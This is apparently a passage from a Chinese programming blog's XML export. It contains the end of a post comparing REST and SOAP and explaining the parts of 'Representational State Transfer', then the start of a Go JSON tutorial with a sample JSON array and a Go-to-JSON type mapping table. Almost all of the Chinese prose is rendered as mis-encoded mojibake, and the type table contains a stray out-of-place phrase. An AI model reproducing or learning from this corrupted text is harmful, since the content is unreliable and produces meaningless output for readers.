ÊòØ1998Âπ¥‰∏ÄÁæ§‰∫∫ÂíåÂæÆËΩØÂêà‰ΩúËÄå‰∫ßÁîüÁöÑ„ÄÇÂÖ∂‰∏≠ÁöÑ‰∏Ä‰∏™‰∫∫Âè´Êà¥Â§´¬∑Áª¥Á∫≥,‰ªñÊòØXML-RPC(‰∏ÄÁßç‰ΩøÁî®xml‰Ωú‰∏∫ Ê†áÂáÜÁöÑÊ∂àÊÅØËΩΩ‰Ωì ÁöÑ ËøúÁ®ãËøáÁ®ãË∞ÉÁî®)ÁöÑÂàõÈÄ†ËÄÖ, ‰πüÊ≠£ÊòØËøôÈ°πÂàõÈÄ†ÂØºËá¥ÁöÑSOAPÁöÑ‰∫ßÁîüÔºåÂ∞ΩÁÆ°Ë¢´ÂæÆËΩØ,IBMÂíåÂÖ∂‰ªñÂÖ¨Âè∏ÊîØÊåÅÔºå‰ΩÜÊòØSOAPÁõ¥Âà∞2003Âπ¥ÊâçË¢´W3CÊ≠£ÂºèÊâøËÆ§„ÄÇ ‰ΩøÁî®SOAP WebÊúçÂä°Á¨¶Âêà‰∏ÄÁªÑÁâπÂæÅÔºå‰ΩøÂàÜÂ∏ÉÂºèÂØπË±°‰πãÈó¥ÁöÑÈÄö‰ø°Êàê‰∏∫‰∫ÜÂèØËÉΩ: ÂçèËÆÆÊòØÂèØÊâ©Â±ïÁöÑ: Êâ©Â±ïÁöÑÂü∫Êú¨ÂäüËÉΩÂèØ‰ª•ÊûÑÂª∫Âíå‰ΩøÁî®ËÄå‰∏çÂΩ±Âìç‰∏ªË¶ÅÁâπÂæÅ Ê∂àÊÅØÂÜÖÂÆπÂ∫îËØ•Áã¨Á´ã‰∫é‰º†ËæìÊú∫Âà∂: SOAP‰∏ç‰ªÖÂèØ‰ª•ÈÄöËøáHTTP‰º†ËæìÊ∂àÊÅØÂÜÖÂÆπÔºåËÄå‰∏îÂÖ∂‰ªñ‰º†ËæìÂçèËÆÆ‰πüÊîØÊåÅÊØîÂ¶ÇÔºöSMTP„ÄÇSMTPË¢´Áî®Êù•Êèê‰æõÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®‰πãÈó¥ÁöÑÂºÇÊ≠•ÈÄö‰ø°„ÄÇ Â∫ïÂ±ÇÁºñÁ®ãÊ®°ÂûãËß£ËÄ¶: Âú®ÈÄªËæë‰∏ä SOAPÁöÑÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Á´ØÁöÑÂºÄÂèëÊó∂ÂÆåÂÖ®Áã¨Á´ãÁöÑ„ÄÇ SAOPÂú®‰ªñÂàöÂá∫‰∏ñÁöÑÂâçÂá†Âπ¥ÔºåÈùûÂ∏∏ÁõõË°åÔºå‰ΩÜÊòØÈöèÂêé‰∏ÄÁõ¥Ëµ∞‰∏ãÂù°Ë∑ØÔºå‰ΩÜÊòØSAOPÁé∞Âú®‰ªçÁÑ∂Âà´‰∏Ä‰∫õ‰ºÅ‰∏öÁ∫ßÁöÑÁéØÂ¢É‰ΩøÁî®ÁùÄÔºåËøôÊòØÂõ†‰∏∫Âú®‰ºÅ‰∏öÁ∫ßÁöÑÈúÄÊ±ÇÈáåÈù¢,‰∏çÂêåÊúçÂä°‰πãÈó¥ÁöÑÈÄö‰ø°ÈúÄË¶ÅÈÅµÂæ™‰∏ÄÂ•óËßÑÂàôÂíåÁ∫¶Êùü„ÄÇÊ≠£ÊòØÂõ†‰∏∫ÂÆÉÈÅµÂæ™ÂØπË±°„ÄÅËßÑÂàôÂíåÁ∫¶Êùü,ÊâÄ‰ª•SOAPÊòØ‰∏Ä‰∏™ÊØîRESTÊõ¥‰∏•Ê†ºÁöÑÂçèËÆÆ„ÄÇ SOAPÂú®ËæÉÂ§ßÁöÑÁªÑÁªá‰∏≠Ëµ¢Âæó‰∫ÜÊîØÊåÅ,‰∏ªË¶ÅÂéüÂõ†ÊòØÂΩìÊó∂ÂæÆËΩØÁöÑÊîØÊåÅÔºå‰ª•ÂèäÂ∏ÇÂú∫Áî±ÂæÆËΩØ‰∏ªÂØº„ÄÇWindows Communication Foundation(WCF),‰ª•ÂæÆËΩØÂπ≥Âè∞‰Ωú‰∏∫Ê†∏ÂøÉÂºÄÂèë, Áõ¥Âà∞‰ªäÂ§©‰ªçÁÑ∂ÊîØÊåÅSOAPÔºå ËÄåÂÖ∂‰ªñÊñπÂºèÂÆûÁé∞ÁöÑSAOPÁöÑÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Á´ØÊ°ÜÊû∂ÊúâPHP Zend FrameworkÂíåApache CXF REST vs SOAP ËÆæËÆ°Âì≤Â≠¶SOAP‰∏ªË¶ÅÊòØÊèê‰æõ‰∫Ü‰∏ÄÁßçËøúÁ®ãËÆøÈóÆÂíåÊìç‰ΩúÂØπË±°ÁöÑÊñπÂºèÔºåËÄåRESTÂàôÂÖ≥Ê≥®ËµÑÊ∫êÂèØ‰ª•Ë¢´ÊâßË°åÁöÑÊìç‰Ωú„ÄÇÁî±Ê≠§ÂèØËßÅSAOPÊõ¥ÂÖ≥Ê≥®ÂäüËÉΩÔºåËÄåRESTÊõ¥ÂÖ≥Ê≥®ËµÑÊ∫êÔºåËøô‰∏ªË¶Å‰∏é‰ªñ‰ª¨ÁöÑËÆæËÆ°Âì≤Â≠¶ÂíåÂá∫ÁîüÊúâÂÖ≥(ÂâçÈù¢Â∑≤ÁªèÊèêÂèä), Ê≠£ÊòØÁî±‰∫éËøô‰∫õÂå∫Âà´ÔºåREST‰∏ªË¶ÅË¢´Áî®Êù•ËÆæËÆ°Êö¥Èú≤‰∫é‰∫íËÅîÁΩëÁöÑÂÖ¨ÁΩëAPIÔºåËÄåÁî±‰∫éRESTÁªßÊâø‰∫ÜHTTPÁöÑÊìç‰ΩúÔºåÊõ¥‰ΩøÂæóÂÆÉÊàê‰∏∫ÊûÑÂª∫ÂºÄÊîæÁöÑWEB APIÁöÑ‰∏ç‰∫å‰πãÈÄâ„ÄÇ ‰∫íËÅîÁΩëÂÖ¨Âè∏ÊîØÊåÅRESTfulÂæàÊµÅË°åÁöÑ‰∏Ä‰∏™‰∏ªË¶ÅÂéüÂõ†ÊòØ‰∫íËÅîÁΩëÂ∑®Â§¥ÁöÑ‰ΩøÁî®Ôºå‰ª•ÂèäËøô‰∫õ‰∫íËÅîÁΩëÂ∑®Â§¥ÁöÑÈºìÂä±ÂíåÊé®Ëçê Â∏¶ÂÆΩÊ∂àËÄóÂú®‰Ω†‰∏çÈúÄË¶ÅÂ∞Ü‰∏ÄÁªÑÂØπË±°ÂÖ®Êò†Â∞ÑÁªôÂÆ¢Êà∑Á´ØÁöÑÂú∫ÊôØ‰∏≠Ôºå RESTÊ∞∏ËøúÈÉΩË¶Å‰ºò‰∫éSOAPÔºå ËÄåÂ§ßÂ§öÊï∞ÊÉÖÂÜµ‰∏ãÔºå ÂÆåÂÖ®Ê≤°ÊúâÂøÖË¶ÅÂ∞ÜÊúçÂä°Âô®Á´ØÁöÑ‰∏ÄÁªÑÂØπË±°ÂÖ®Êò†Â∞ÑÁªôÂÆ¢Êà∑Á´Ø„ÄÇËÄåÂØπË±°ÁöÑÊù•ÂõûÊò†Â∞ÑÊòØÊûÅÂÖ∑Ê∂àËÄóÂ∏¶ÂÆΩÁöÑÔºåËøô‰πüÊòØ‰∏∫Âï•ËØ¥SOAPÊØîËæÉÈáçÁöÑÂéüÂõ†ÊâÄÂú®„ÄÇ ÊâÄ‰ª•Â∞ΩÈáèÈÅøÂÖç‰ΩøÁî®SOAPÔºå ÁâπÂà´ÊòØÂΩì‰Ω†ÁöÑÂ∏¶ÂÆΩËµÑÊ∫êÈùûÂ∏∏ÁèçË¥µÁöÑÊÉÖÂΩ¢‰∏ãÔºåÊØîÂ¶ÇÁßªÂä®app ÊòìÁî®ÊÄßËøôÊòØÊúÄÈáçË¶ÅÁöÑÂéüÂõ†, RESTÊØîSOAPÁÆÄÂçï, Â≠¶‰π†Âíå‰ΩøÁî®RESTful APIÁöÑ‰ª£‰ª∑ÊûÅ‰ΩéÔºåËøô‰ΩøÂæóÂºÄÂèëRESTfulAPIÁöÑÊó∂Èó¥‰∏äÊØîSOAPÁü≠„ÄÇRESTfulÈÄöËøáHTTPÁöÑÊñπÊ≥ïÊù•Êìç‰ΩúËµÑÊ∫êÔºåÈÄöËøájsonÊù•‰∫§Êç¢Êï∞ÊçÆÔºå Êó†ËÆ∫ÊòØHTTPÂçèËÆÆ‰∏äÁöÑ‰ΩøÁî®ÁÆÄÂçï(request url and get response), ËøòÊòØÊï∞ÊçÆ‰∫§Êç¢Ê†ºÂºèJsonÁöÑÊµÅË°åÔºåÂΩìÁÑ∂JsonÁöÑÊµÅË°å‰∏ªË¶ÅÊòØÂõ†‰∏∫javascript, ÈÉΩ‰ΩøÂæóRESTÊØîSOAPÊõ¥Êòì‰∫éË¢´‰∫∫‰ª¨Êé•Êî∂Âíå‰ΩøÁî®„ÄÇ ÊïèÊç∑ÊÄßÁî±‰∫éRESTËΩªÁ∫¶Êùü(Ëøô‰∏™‰∏ªË¶ÅÊòØÊó†Áä∂ÊÄÅÁöÑËÆæËÆ°)Ôºå ËÄåSOAPÈáçÁ∫¶ÊùüÔºå ‰ΩøÂæóRESTÊõ¥Âä†ÁÅµÊ¥ªÔºåÂΩìWEB APIÊúâÂèòÂåñÊó∂ ‰ºÅ‰∏öÂèØ‰ª•Âø´ÈÄüÁöÑÈÄÇÁî®„ÄÇ Ê∑±ÂÖ•RESTfulÂú®ÂØπRESTfulÁöÑÂâç‰∏ñ‰ªäÁîüÔºå ‰ª•ÂèäÂ¶Ç‰ΩïPKÊéâSOAPÁöÑ ‰∫ÜËß£‰∏ãÔºå RESTfulÁöÑÂÖ∑‰ΩìÊ¶ÇÂøµ ‰πüÂ∞±ÊØîËæÉÂ•ΩÁêÜËß£‰∫ÜÔºå Â¶ÇÊûúÊõ¥Ê∑±ÂÖ•‰∫ÜËß£RESTfulÁöÑÊ¶ÇÂøµÔºåÂèØËßÅÂèÇËÄÉÂêéÈù¢FieldingÁöÑÂçöÂ£´ÁîüËÆ∫ÊñáÁ¨¨5Á´†ÔºåÊñáÁ´†ÊúÄÂêéÊúâËøûÊé•„ÄÇ ÂêçÁß∞ÂêçÁß∞ÂæÄÂæÄÈÉΩÈùûÂ∏∏ÈáçË¶Å, Âõ†‰∏∫ÂÆÉÊòØÂØπËøô‰∏™‰∫ãÁâ©ÁöÑÈ´òÂ∫¶ÊäΩË±°,ÊØîÂ¶ÇDocker, ‰ªñÁöÑËã±ÊñáÊÑèËØÜÊòØÁ†ÅÂ§¥ÁöÑÊê¨ËøêÂ∑•ÔºåËÄåDockerÁúüÊ≠£ÁöÑÁî®ÈÄîÊòØËΩØ‰ª∂ÁöÑÊê¨ËøêÂ∑•ÔºåÊâÄ‰ª•ÊòØ‰∏çÊòØÂæàÊúâÊÑèÊÄù„ÄÇFieldingÂ∞Ü‰ªñÂØπ‰∫íËÅîÁΩëËΩØ‰ª∂ÁöÑÊû∂ÊûÑÂéüÂàôÔºåÂÆöÂêç‰∏∫RESTÔºåÂç≥Representational State TransferÁöÑÁº©ÂÜô„ÄÇËøô‰∏™ËØçÁªÑÁöÑÁøªËØëÊòØ‚ÄùË°®Áé∞Â±ÇÁä∂ÊÄÅËΩ¨Âåñ‚Äù„ÄÇÂõ†Ê≠§Ë¶ÅÁêÜËß£RESTfulÂà∞Â∫ïÊòØ‰∏ÄÁßçÂï•Ê†∑ÁöÑ‰∫íËÅîÁΩëËΩØ‰ª∂ËÆæËÆ°È£éÊ†ºÔºåÁêÜËß£Â•ΩRepresentational State Transfer ËøôÁªÑÂçïËØçÊòØÁ¨¨‰∏ÄÊ≠•„ÄÇ ËøôÂçïËØç‰∏≠ÂåÖÂê´‰∫ÜÈÇ£‰∫õ‰ø°ÊÅØÂñÉ? RESTÁöÑÂêçÁß∞‚ÄùË°®Áé∞Â±ÇÁä∂ÊÄÅËΩ¨Âåñ‚Äù‰∏≠ÔºåÁúÅÁï•‰∫Ü‰∏ªËØ≠„ÄÇ‚ÄùË°®Áé∞Â±Ç‚ÄùÂÖ∂ÂÆûÊåáÁöÑÊòØ‚ÄùËµÑÊ∫ê‚Äù(Resources)ÁöÑ‚ÄùË°®Áé∞Â±Ç‚Äù„ÄÇÂõ†Ê≠§Â∞±Êúâ3‰∏™Ë¶ÅÁ¥†ÔºöËµÑÊ∫ê„ÄÅË°®Áé∞„ÄÅËΩ¨Êç¢. Resource(ËµÑÊ∫ê)ÊâÄË∞ì‚ÄùËµÑÊ∫ê‚ÄùÔºåÂ∞±ÊòØÁΩëÁªú‰∏äÁöÑ‰∏Ä‰∏™ÂÆû‰ΩìÔºåÊàñËÄÖËØ¥ÊòØÁΩëÁªú‰∏äÁöÑ‰∏Ä‰∏™ÂÖ∑‰Ωì‰ø°ÊÅØ„ÄÇÂÆÉÂèØ‰ª•ÊòØ‰∏ÄÊÆµÊñáÊú¨„ÄÅ‰∏ÄÂº†ÂõæÁâá„ÄÅ‰∏ÄÈ¶ñÊ≠åÊõ≤„ÄÅ‰∏ÄÁßçÊúçÂä°ÔºåÊÄª‰πãÂ∞±ÊòØ‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑÂÆûÂú®„ÄÇ‰Ω†ÂèØ‰ª•Áî®‰∏Ä‰∏™URI(Áªü‰∏ÄËµÑÊ∫êÂÆö‰ΩçÁ¨¶)ÊåáÂêëÂÆÉÔºåÊØèÁßçËµÑÊ∫êÂØπÂ∫î‰∏Ä‰∏™ÁâπÂÆöÁöÑURI„ÄÇË¶ÅËé∑ÂèñËøô‰∏™ËµÑÊ∫êÔºåËÆøÈóÆÂÆÉÁöÑURIÂ∞±ÂèØ‰ª•ÔºåÂõ†Ê≠§URIÂ∞±Êàê‰∫ÜÊØè‰∏Ä‰∏™ËµÑÊ∫êÁöÑÂú∞ÂùÄÊàñÁã¨‰∏ÄÊó†‰∫åÁöÑËØÜÂà´Á¨¶„ÄÇ ‰∫∫‰ª¨ÂæÄÂæÄÂÆπÊòìÊääRUIÂíåURLÊêûÊ∑∑ÔºåÂÆûÈôÖ‰∏ä‰ªñ‰ª¨ÁöÑÁ°ÆÊòØÊåáÂêå‰∏ÄÁßç‰∫ãÁâ©(ËµÑÊ∫ê), Âè™ÊòØÁ´ôÁöÑËßíÂ∫¶‰∏çÂêå, ËÄåÂè´Ê≥ï‰∏çÂêåËÄåÂ∑≤: Á´ôÂú®ÂÆ¢Êà∑Á´ØÔºåÊàë‰ª¨Âè´ËÆøÈóÆËµÑÊ∫êÁöÑË∑ØÂæÑÂè´URL, Á´ôÂú®ÊúçÂä°Âô® Êàë‰ª¨ÂÆö‰πâËµÑÊ∫êÁöÑË∑ØÂæÑÂè´ RUI ËÄåÊï¥‰∏™‰∫íËÅîÁΩë Â∞±ÊòØÁî±Ëøô‰∫õËµÑÊ∫êÁªÑÂêàËÄåÊàêÁöÑ. Representational(Ë°®Áé∞Â±Ç)‚ÄúËµÑÊ∫ê‚ÄùÊòØ‰∏ÄÁßç‰ø°ÊÅØÂÆû‰Ωì, ÂÆÉÂèØ‰ª•ÊúâÂ§öÁßçÂ§ñÂú®Ë°®Áé∞ÂΩ¢Âºè. Êàë‰ª¨Êää‚ÄùËµÑÊ∫ê‚ÄùÂÖ∑‰ΩìÂëàÁé∞Âá∫Êù•ÁöÑÂΩ¢Âºè, Âè´ÂÅöÂÆÉÁöÑË°®Áé∞Â±Ç(Representation).ÊØîÂ¶ÇÔºåÊñáÊú¨ÂèØ‰ª•Áî®txtÊ†ºÂºèË°®Áé∞Ôºå‰πüÂèØ‰ª•Áî®HTMLÊ†ºÂºè„ÄÅXMLÊ†ºÂºè„ÄÅJSONÊ†ºÂºèË°®Áé∞ÔºåÁîöËá≥ÂèØ‰ª•ÈááÁî®‰∫åËøõÂà∂Ê†ºÂºèÔºõÂõæÁâáÂèØ‰ª•Áî®JPGÊ†ºÂºèË°®Áé∞Ôºå‰πüÂèØ‰ª•Áî®PNGÊ†ºÂºèË°®Áé∞„ÄÇ URIÂè™‰ª£Ë°®ËµÑÊ∫êÁöÑÂÆû‰ΩìÔºå‰∏ç‰ª£Ë°®ÂÆÉÁöÑÂΩ¢Âºè„ÄÇ‰∏•Ê†ºÂú∞ËØ¥ÔºåÊúâ‰∫õÁΩëÂùÄÊúÄÂêéÁöÑ‚Äù.html‚ÄùÂêéÁºÄÂêçÊòØ‰∏çÂøÖË¶ÅÁöÑÔºåÂõ†‰∏∫Ëøô‰∏™ÂêéÁºÄÂêçË°®Á§∫Ê†ºÂºè, Â±û‰∫éË°®Áé∞Â±ÇËåÉÁï¥ÔºåËÄåURIÂ∫îËØ•Âè™‰ª£Ë°®ËµÑÊ∫êÁöÑ‰ΩçÁΩÆ„ÄÇÂÆÉÁöÑÂÖ∑‰ΩìË°®Áé∞ÂΩ¢ÂºèÔºåÂ∫îËØ•Âú®HTTPËØ∑Ê±ÇÁöÑÂ§¥‰ø°ÊÅØ‰∏≠Áî®AcceptÂíåContent-TypeÂ≠óÊÆµÊåáÂÆöÔºåËøô‰∏§‰∏™Â≠óÊÆµÊâçÊòØÂØπË°®Áé∞Â±ÇÁöÑÊèèËø∞„ÄÇ State Transfer(Áä∂ÊÄÅËΩ¨Êç¢)ËÆøÈóÆ‰∏Ä‰∏™ÁΩëÁ´ô, Â∞±‰ª£Ë°®‰∫ÜÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®ÁöÑ‰∏Ä‰∏™‰∫íÂä®ËøáÁ®ã„ÄÇÂú®Ëøô‰∏™ËøáÁ®ã‰∏≠ÔºåÂäøÂøÖÊ∂âÂèäÂà∞Êï∞ÊçÆÂíåÁä∂ÊÄÅÁöÑÂèòÂåñ„ÄÇ ‰∫íËÅîÁΩëÈÄö‰ø°ÂçèËÆÆHTTPÂçèËÆÆ, ÊòØ‰∏Ä‰∏™Êó†Áä∂ÊÄÅÂçèËÆÆ„ÄÇËøôÊÑèÂë≥ÁùÄ, ÊâÄÊúâÁöÑÁä∂ÊÄÅÈÉΩ‰øùÂ≠òÂú®ÊúçÂä°Âô®Á´Ø„ÄÇÂõ†Ê≠§, Â¶ÇÊûúÂÆ¢Êà∑Á´ØÊÉ≥Ë¶ÅÊìç‰ΩúÊúçÂä°Âô®, ÂøÖÈ°ªÈÄöËøáÊüêÁßçÊâãÊÆµËÆ©ÊúçÂä°Âô®Á´ØÂèëÁîüÁä∂ÊÄÅËΩ¨Âåñ(State Transfer). ËÄåËøôÁßçËΩ¨ÂåñÊòØÂª∫Á´ãÂú®Ë°®Áé∞Â±Ç‰πã‰∏äÁöÑÔºåÊâÄ‰ª•Â∞±ÊòØ‚ÄùË°®Áé∞Â±ÇÁä∂ÊÄÅËΩ¨Âåñ‚Äù„ÄÇ ÂÆ¢Êà∑Á´ØÁî®Âà∞ÁöÑÊâãÊÆµÔºåÂè™ËÉΩÊòØHTTPÂçèËÆÆ„ÄÇÂÖ∑‰ΩìÊù•ËØ¥ÔºåÂ∞±ÊòØHTTPÂçèËÆÆÈáåÈù¢ÔºåÂõõ‰∏™Ë°®Á§∫Êìç‰ΩúÊñπÂºèÁöÑÂä®ËØçÔºöGET„ÄÅPOST„ÄÅPUT„ÄÅDELETE„ÄÇÂÆÉ‰ª¨ÂàÜÂà´ÂØπÂ∫îÂõõÁßçÂü∫Êú¨Êìç‰ΩúÔºöGETÁî®Êù•Ëé∑ÂèñËµÑÊ∫êÔºåPOSTÁî®Êù•Êñ∞Âª∫ËµÑÊ∫êÔºà‰πüÂèØ‰ª•Áî®‰∫éÊõ¥Êñ∞ËµÑÊ∫êÔºâÔºåPUTÁî®Êù•Êõ¥Êñ∞ËµÑÊ∫êÔºåDELETEÁî®Êù•Âà†Èô§ËµÑÊ∫ê„ÄÇ ÂèÇËÄÉÊñáÊ°£ RESTful tutorial REST vs SOAP ÈòÆ‰∏ÄÂ≥∞ÂçöÂÆ¢ FieldingËÆ∫ÊñáÂØπRESTfulÂÖ∑‰ΩìÊèèËø∞]]></content>
      <categories>
        <category>Á®ãÂ∫èËÆæËÆ°</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GoËØ≠Ë®ÄJSONËØ¶Ëß£]]></title>
    <url>%2F2017%2F10%2F03%2Fgolang-json%2F</url>
    <content type="text"><![CDATA[ÁõÆÂâçÊàë‰ª¨ÁúãÂà∞ÂæàÂ§öÁöÑÂºÄÊîæÂπ≥Âè∞ÔºåÂü∫Êú¨‰∏äÈÉΩÊòØÈááÁî®‰∫ÜJSON‰Ωú‰∏∫‰ªñ‰ª¨ÁöÑÊï∞ÊçÆ‰∫§‰∫íÁöÑÊ†ºÂºè„ÄÇÊó¢ÁÑ∂JSONÂú®WebÂºÄÂèë‰∏≠Â¶ÇÊ≠§ÈáçË¶ÅÔºåÈÇ£‰πàGoËØ≠Ë®ÄÂØπJSONÊîØÊåÅÁöÑÊÄé‰πàÊ†∑Âë¢ÔºüGoËØ≠Ë®ÄÁöÑÊ†áÂáÜÂ∫ìÂ∑≤ÁªèÈùûÂ∏∏Â•ΩÁöÑÊîØÊåÅ‰∫ÜJSONÔºåÂèØ‰ª•ÂæàÂÆπÊòìÁöÑÂØπJSONÊï∞ÊçÆËøõË°åÁºñ„ÄÅËß£Á†ÅÁöÑÂ∑•‰Ωú„ÄÇÂ¶ÇÊûúÊúâÊõ¥ÁÅµÊ¥ªÁöÑÈúÄÊ±Ç‰πüÊúâ‰∏çÈîôÁöÑÁ¨¨‰∏âÊñπÂ∫ìÊèê‰æõÊîØÊåÅ„ÄÇËøôÁØáÊñáÁ´†Â∞ÜÂÖ®Èù¢Ëß£ËØªGolang‰∏≠JSONÁöÑ‰ΩøÁî®„ÄÇ JSONÁÆÄ‰ªãJSONÔºàJavascript Object NotationÔºâÊòØ‰∏ÄÁßçËΩªÈáèÁ∫ßÁöÑÊï∞ÊçÆ‰∫§Êç¢ËØ≠Ë®ÄÔºå‰ª•ÊñáÂ≠ó‰∏∫Âü∫Á°ÄÔºåÂÖ∑ÊúâËá™ÊàëÊèèËø∞ÊÄß‰∏îÊòì‰∫éËÆ©‰∫∫ÈòÖËØª„ÄÇÂ∞ΩÁÆ°JSONÊòØJavascript Standard ECMA-262 3rd Edition ‚Äì December 1999ÁöÑ‰∏Ä‰∏™Â≠êÈõÜÔºå‰ΩÜJSONÊòØÁã¨Á´ã‰∫éËØ≠Ë®ÄÁöÑÊñáÊú¨Ê†ºÂºèÔºåÂπ∂‰∏îÈááÁî®‰∫ÜÁ±ª‰ºº‰∫éCËØ≠Ë®ÄÂÆ∂ÊóèÁöÑ‰∏Ä‰∫õ‰π†ÊÉØ, Ëøô‰∫õÁâπÊÄß‰ΩøJSONÊàê‰∏∫ÁêÜÊÉ≥ÁöÑÊï∞ÊçÆ‰∫§Êç¢ËØ≠Ë®Ä„ÄÇ JSON‰∏éXMLÊúÄÂ§ßÁöÑ‰∏çÂêåÂú®‰∫éXMLÊòØ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÊ†áËÆ∞ËØ≠Ë®ÄÔºåËÄåJSON‰∏çÊòØ„ÄÇJSONÁî±‰∫éÊØîXMLÊõ¥Â∞è„ÄÅÊõ¥Âø´ÔºåÊõ¥ÊòìËß£Êûê,‰ª•ÂèäÊµèËßàÂô®ÁöÑÂÜÖÂª∫Âø´ÈÄüËß£ÊûêÊîØÊåÅ,‰ΩøÂæóÂÖ∂Êõ¥ÈÄÇÁî®‰∫éÁΩëÁªúÊï∞ÊçÆ‰º†ËæìÈ¢ÜÂüü„ÄÇ Âú®ËÆ≤Ëß£JSONÁöÑÊï∞ÊçÆÁªìÊûÑ‰πãÂâç, Êàë‰ª¨ÂÖàÊù•‰∏ÄÊÆµÁÆÄÂçïÁöÑÊ†∑‰æãJSONÊï∞ÊçÆ:12345678910111213141516171819202122[ &#123; "precision": "zip", "Latitude": 37.7668, "Longitude": -122.3959, "Address": "", "City": "SAN FRANCISCO", "State": "CA", "Zip": "94107", "Country": "US" &#125;, &#123; "precision": "zip", "Latitude": 37.371991, "Longitude": -122.026020, "Address": "", "City": "SUNNYVALE", "State": "CA", "Zip": "94085", "Country": "US" &#125;] JSONÂª∫ÊûÑ‰∫é‰∏§ÁßçÁªìÊûÑ: ÈîÆÂÄºÂØπÁöÑÈõÜÂêà(A collection of name/value pairs): Âú®‰∏çÂêåÁöÑËØ≠Ë®Ä‰∏≠, ‰ªñ‰ª¨Ë¢´ÁêÜËß£‰∏∫: object(Javascript), struct(Golang), Dictinary(Python), ‰ª•ÂèäÂìàÂ∏åË°®(hash table), ÊúâÈîÆÂàóË°®(keyed list), ÊàñËÄÖÂÖ≥ËÅîÊï∞ÁªÑ(associative array). ÂÄºÁöÑÊúâÂ∫èÂàóË°®(An ordered list of values): Âú®Â§ßÈÉ®ÂàÜËØ≠Ë®Ä‰∏≠ÔºåÂÆÉË¢´ÁêÜËß£‰∏∫Êï∞ÁªÑ(array). ÂÖ∂‰∏≠ÂÄºÂèØ‰ª•ÂåÖÂê´Â¶Ç‰∏ãÁ±ªÂûã, Âπ∂‰∏îËøô‰∫õÁªìÊûÑÂèØ‰ª•ÂµåÂ•ó: Â≠óÁ¨¶‰∏≤(string): Áî±ÂèåÂºïÂè∑ÂåÖÂõ¥ÁöÑ‰ªªÊÑèÊï∞ÈáèUnicodeÂ≠óÁ¨¶ÁöÑÈõÜÂêàÔºå‰ΩøÁî®ÂèçÊñúÁ∫øËΩ¨‰πâ, ‰∏Ä‰∏™Â≠óÁ¨¶(character)Âç≥‰∏Ä‰∏™ÂçïÁã¨ÁöÑÂ≠óÁ¨¶‰∏≤(character string) Êï∞ÂÄº(number): ÂêåÊó∂ÂåÖÂê´Êï¥Êï∞ÂíåÊµÆÁÇπÊï∞ Â∏ÉÂ∞îÂÄº(booleans): Â∏ÉÂ∞îÂÄºÂåÖÂê´: trueÂíåfalse Á©∫(null): Á©∫ ÂØπË±°(object): ÈîÆÂÄºÂØπÁöÑÈõÜÂêà Êï∞ÁªÑ(array): ÂÄºÁöÑÊúâÂ∫èÂàóË°® Ëøô‰∫õÈÉΩÊòØÂ∏∏ËßÅÁöÑÊï∞ÊçÆÁªìÊûÑ„ÄÇ‰∫ãÂÆû‰∏äÂ§ßÈÉ®ÂàÜÁé∞‰ª£ËÆ°ÁÆóÊú∫ËØ≠Ë®ÄÈÉΩ‰ª•ÊüêÁßçÂΩ¢ÂºèÊîØÊåÅÂÆÉ‰ª¨„ÄÇËøô‰ΩøÂæó‰∏ÄÁßçÊï∞ÊçÆÊ†ºÂºèÂú®ÂêåÊ†∑Âü∫‰∫éËøô‰∫õÁªìÊûÑÁöÑÁºñÁ®ãËØ≠Ë®Ä‰πãÈó¥‰∫§Êç¢Êàê‰∏∫ÂèØËÉΩ„ÄÇ JSON‰∏éGoÊï∞ÊçÆÁªìÊûÑÊò†Â∞ÑJSONÊ†ºÂºèÂèØ‰ª•ÁÆóÊàë‰ª¨Êó•Â∏∏ÊúÄÂ∏∏Áî®ÁöÑÂ∫èÂàóÂåñÊ†ºÂºè‰πã‰∏Ä‰∫Ü, GoËØ≠Ë®Ä‰Ωú‰∏∫‰∏Ä‰∏™Áî±GoogleÂºÄÂèë, Âè∑Áß∞‰∫íËÅîÁΩëÁöÑCËØ≠Ë®ÄÁöÑËØ≠Ë®Ä, Ëá™ÁÑ∂‰πüÂØπJSONÊ†ºÂºèÊîØÊåÅÂæàÂ•Ω„ÄÇGolangÁöÑÊ†áÂáÜÂ∫ìencoding/jsonÂÆûÁé∞ÁöÑJSONÊ†áÂáÜ(RFC 4627)ÁöÑÁºñÁ†ÅÂíåËß£Á†Å, ÂèØ‰ª•ËÆ©Êàë‰ª¨ÂæàÊñπ‰æøÂú∞ËøõË°åJSONÊï∞ÊçÆÁöÑËΩ¨Êç¢. ÂÖ∑‰ΩìËØ¶ÊÉÖÂèØ‰ª•ÂèÇËÄÉÊ†áÂáÜÂ∫ìMarshalÂíåUnmarshalÂáΩÊï∞ÁöÑÊ≥®Èáä, ‰∏ãÈù¢ÊòØ‰∏Ä‰∏™Âü∫Êú¨ÁöÑÊï∞ÊçÆÂÖ≥Á≥ªÊò†Â∞ÑÊÄªÁªì: Golang Type JSON Type Description bool booleans true or false int, float numbers ÂØπ‰∫égolangÊâÄÊúâÁöÑÊï∞ÂÄºÁ±ªÂûã string strings Â≠óÁ¨¶‰∏≤‰ºöËΩ¨Êç¢ÊàêUTF-8ËøõË°åËæìÂá∫ÔºåÊó†Ê≥ïËΩ¨Êç¢ÁöÑ‰ºöÊâìÂç∞ÂØπÂ∫îÁöÑunicodeÂÄº„ÄÇËÄå‰∏î‰∏∫‰∫ÜÈò≤Ê≠¢ÊµèËßàÂô®ÊääjsonËæìÂá∫ÂΩìÂÅöhtmlÔºå ‚Äú&lt;‚Äù„ÄÅ‚Äù&gt;‚Äù ‰ª•Âèä ‚Äú&amp;‚Äù ‰ºöË¢´ËΩ¨‰πâ‰∏∫ ‚Äú\u003c‚Äù„ÄÅ‚Äù\u003e‚Äù Âíå ‚Äú\u0026‚Äù array,slice arrays Publish Acknowledgment struct objects Âè™ÊúâÂØºÂá∫ÁöÑÂ≠óÊÆµ(‰ª•Â§ßÂÜôÂ≠óÊØçÂºÄÂ§¥)Êâç‰ºöÂú®ËæìÂá∫‰∏≠ nil null Á©∫ 